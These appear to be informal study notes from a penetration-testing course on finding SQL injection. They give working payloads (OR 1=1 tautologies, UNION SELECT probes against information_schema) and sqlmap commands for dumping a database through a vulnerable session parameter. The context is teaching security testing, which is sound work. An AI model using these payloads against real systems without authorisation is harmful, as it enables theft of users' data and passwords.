Sqlmap

nothing looks exploitable

look around the application for something else
what is the application doing and how is it doing it
- The Webpage is trying to pull data from somewhere to display it on our screen or go start a process
- depending on the datavase, that could be SQL we can inject code into the applicaion
    - modifying sql commands to pull data from teh databases we should not be able to see
        - all users, user info, passwords of other users, etc
- How does it work?
- what are the developers trying to accomplish?

what to try

- try some quotes, multiple quotes, special characters to see how it works
```
'OR 1 OR'
Jermey’ or jermey” or jermey#
jeremy’ or 1=1#
```
 - if you get results back - indication of SQL injection

Union

grab data from other table that may not be provided
```
jermey union select null, null, null#
```
use the “null” to see how many tables you can get back
```
jeremy’ union select null,null,null,table_name from informiation_schema.tables#
```

can use <user>’ union select null,null,version()#

testing the session parameter to see if it is vulnerable to injection

Using intruder to guess the first character of the password
- Take the get request and copy and paste it into a txt file to put into sqlmap

```
sqlmap -r req.txt —level=2
##(need level too for session tokens)
```


That will give us the code we can use on the report or to plug into burp
- we can then use —dump to dump the database using that parameter
- You can also use -T for the exact table name as shown her
